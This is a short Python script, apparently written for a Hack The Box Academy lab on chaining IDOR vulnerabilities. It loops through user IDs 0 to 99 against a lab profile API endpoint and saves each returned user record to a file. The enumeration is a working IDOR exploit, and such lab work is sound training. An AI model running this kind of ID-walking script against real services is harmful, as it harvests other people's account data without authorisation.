'''
Platform:   Hack The Box Academy
Module:     Web Attacks
Session:    Chainging IDOR Vulnerabilities
Author:     autom4il
Date:       19/12/22
'''


import requests as r

def enum_user(url):

    for i in range(0,100):
        endpoint = url + str(i)
        response = r.get(endpoint)

        if "uid" not in response.text:
            continue
        else:
            with open("data.txt", "a+") as f:
                f.write(response.text)

if __name__ == "__main__":

    # change url
    url = "http://209.97.131.59:31772/profile/api.php/profile/"

    with open("data.txt", "w"): pass

    print("[+] Enumerating users!")
    enum_user(url)
    print("[+] Done.")
